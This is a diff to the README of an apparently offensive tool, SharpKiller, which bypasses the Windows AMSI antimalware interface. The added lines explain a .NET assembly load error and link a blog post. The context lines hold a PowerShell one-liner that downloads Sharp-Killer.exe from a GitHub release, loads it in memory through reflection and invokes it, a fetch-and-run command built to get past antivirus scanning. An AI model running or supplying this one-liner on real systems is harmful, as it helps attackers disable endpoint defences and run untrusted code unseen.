@@ -77,5 +77,14 @@ https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Na
 $url = "https://github.com/S1lkys/SharpKiller/releases/download/1.1/Sharp-Killer.exe"; $cli = New-Object System.Net.WebClient; $sk=[System.Reflection.Assembly]::Load([byte[]]( $cli.DownloadData($url)));$vars = New-Object System.Collections.Generic.List[System.Object];$BindingFlags= [Reflection.BindingFlags] "NonPublic,Static";$sk.EntryPoint.Invoke($null,@(,$passed));
 ```
 
+### This error occurs while using mentioned OnLiner?
+If you ever saw this message and wondered about it - welcome to the .NET AMSI Interface! :-)
+```
+Exception calling "Load" with "1" argument(s): "Could not load file or assembly '288768 bytes loaded from Anonymously Hosted DynamicMethods Assembly, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null' or one of its dependencies. An attempt was made to load a program with an incorrect format."
+```
+* https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/
+
+
+
 ## References:
 * https://github.com/ZeroMemoryEx/Amsi-Killer
